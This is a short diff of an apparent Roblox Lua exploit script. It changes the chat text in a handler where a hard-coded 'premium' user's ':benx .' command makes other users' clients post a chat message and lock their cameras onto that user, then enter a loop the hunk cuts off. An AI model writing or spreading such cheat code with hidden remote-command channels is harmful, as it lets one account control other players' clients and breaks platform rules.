@@ -531,7 +531,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":benx .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Yeah Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			wait(0) local A_1 = "oopsie" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
 			local benxed = true
 			while benxed == true do
